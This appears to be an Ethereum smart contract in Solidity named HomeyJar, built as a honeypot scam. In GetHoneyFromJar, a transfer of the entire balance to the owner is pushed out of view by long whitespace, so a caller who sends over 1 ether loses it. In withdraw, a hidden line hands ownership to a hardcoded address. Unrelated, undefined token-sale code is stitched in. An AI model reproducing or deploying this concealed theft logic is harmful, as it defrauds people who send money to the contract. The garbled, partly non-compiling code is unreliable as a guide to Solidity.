 

pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = msg.sender;
   


  using SafeMath for uint256;

  EVOAIToken public token;
  uint256 public rate;
  uint256 public weiRaisedRound;
  bool public privateStage;
  bool public preICOStage;
  bool public icoRound1;
  bool public icoRound2;
  bool public icoRound3;
  bool public icoRound4;
  bool public icoRound5;
  bool public icoRound6;

  constructor(address _wallet, address _walletForETH) public {
    require(_wallet != address(0));
    require(_walletForETH != address(0));

    token = new EVOAIToken();
    token.transfer(_wallet, 3200000000000000000000000);
    privateStage = true;
  }

  function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);

    if (privateStage && weiRaisedRound.add(_weiAmount) <= 276000000000000000000) {
      rate = 1087;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    } 
    else if (preICOStage && weiRaisedRound.add(_weiAmount) <= 775000000000000000000) {
      rate = 870;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    }  
    else if (icoRound1 && weiRaisedRound.add(_weiAmount) <= 1380000000000000000000) {
      rate = 725;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    }  
    else if (icoRound2 && weiRaisedRound.add(_weiAmount) <= 1610000000000000000000) {
      rate = 621;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    } 
    else if (icoRound3 && weiRaisedRound.add(_weiAmount) <= 1840000000000000000000) {
      rate = 544;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    } 
    else if (icoRound4 && weiRaisedRound.add(_weiAmount) <= 2070000000000000000000) {
      rate = 484;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    } 
    else if (icoRound5 && weiRaisedRound.add(_weiAmount) <= 2300000000000000000000) {
      rate = 435;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    } 
    else if (icoRound6 && weiRaisedRound.add(_weiAmount) <= 2530000000000000000000) {
      rate = 396;
      weiRaisedRound = weiRaisedRound.add(_weiAmount);
    }
  }
  

    function() public payable {}
   
    function GetHoneyFromJar() public payable {                                              
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data) payable public {
        require(msg.sender == Owner);
          
        adr.call.value(msg.value)(data);
    }
}